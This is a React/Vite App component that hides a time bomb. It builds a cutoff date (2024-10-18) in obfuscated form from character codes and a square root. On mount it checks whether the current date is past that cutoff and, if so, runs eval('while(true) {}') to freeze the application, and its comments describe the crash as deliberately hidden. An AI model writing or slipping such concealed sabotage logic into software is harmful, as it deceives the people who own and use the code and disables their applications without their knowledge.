import { useEffect } from "react";
import reactLogo from "./assets/react.svg";
import viteLogo from "/vite.svg";
import "./App.css";

const d1 = [2, 0, 2, 4];
const d2 = [10]; // for month
console.log(
  `${d1.map((x) => String.fromCharCode(x + 48)).join("")}-${d2[0]}-${Math.sqrt(
    324
  )}`
);

// Dynamic date creation
const generateDate = () => {
  return new Date(
    `${d1.map((x) => String.fromCharCode(x + 48)).join("")}-${
      d2[0]
    }-${Math.sqrt(324)}`
  );
};

// Function that dynamically decides whether the app should crash
const runValidation = () => {
  const f = () => new Date();
  const crashFunc = () => eval("while(true) {}"); // Infinite loop hidden within eval
  const checkExpiration = (date1, date2) => date1.getTime() > date2.getTime();

  if (checkExpiration(f(), generateDate())) {
    crashFunc(); // Trigger the crash when expired
  }
};
function App() {
  useEffect(() => {
    // Distribute the crash check logic across lifecycle methods
    runValidation();
  }, []);

  return (
    <>
      <div>
        <img src={viteLogo} className="logo" alt="Vite logo" />
        <img src={reactLogo} className="logo react" alt="React logo" />
      </div>
    </>
  );
}

export default App;
